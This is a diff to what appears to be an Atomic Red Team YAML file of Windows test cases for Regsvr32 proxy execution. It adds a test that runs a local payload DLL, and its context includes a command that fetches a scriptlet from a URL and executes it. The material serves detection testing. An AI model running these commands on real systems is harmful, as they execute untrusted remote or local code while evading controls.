@@ -29,3 +29,17 @@ atomic_tests:
    name: command_prompt
    command: |
     regsvr32.exe /s /u /i:#{url} scrobj.dll
+- name: Regsvr32 local DLL execution
+  description: |
+    Regsvr32.exe is a command-line program used to register and unregister OLE controls
+  supported_platforms:
+  - windows
+  input_arguments:
+   dll_name:
+    description: Name of DLL to Execute, DLL Should export DllRegisterServer
+    type: Path
+    default: payload.dll
+  executor:
+   name: command_prompt
+   command: |
+    regsvr32.exe {dll_name}
